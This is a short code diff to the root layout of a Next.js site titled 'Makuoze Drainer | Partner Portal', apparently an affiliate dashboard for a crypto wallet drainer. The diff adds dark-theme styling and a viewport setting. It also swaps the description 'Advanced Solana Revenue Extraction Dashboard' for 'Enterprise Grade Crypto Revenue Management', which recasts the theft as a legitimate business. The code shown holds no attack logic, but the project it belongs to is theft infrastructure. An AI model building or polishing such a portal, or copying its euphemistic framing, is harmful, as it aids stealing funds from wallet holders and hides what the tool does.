@@ -12,17 +12,17 @@ const geistMono = Geist_Mono({
 });
 
 export const metadata = {
-  title: "Makuoze Drainer | Partner Portal",
-  description: "Advanced Solana Revenue Extraction Dashboard",
+  title: 'Makuoze Drainer | Partner Portal',
+  description: 'Enterprise Grade Crypto Revenue Management',
+  viewport: 'width=device-width, initial-scale=1, maximum-scale=1',
 };
 
 export default function RootLayout({ children }) {
   return (
-    <html
-      lang="en"
-      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
-    >
-      <body className="min-h-full flex flex-col">{children}</body>
+    <html lang="en" className={`${geistSans.variable} ${geistMono.variable} dark scroll-smooth selection:bg-makuoze-red/30`}>
+      <body className="antialiased text-rendering-optimizeLegibility ring-white/5 min-h-full flex flex-col">
+        {children}
+      </body>
     </html>
   );
 }
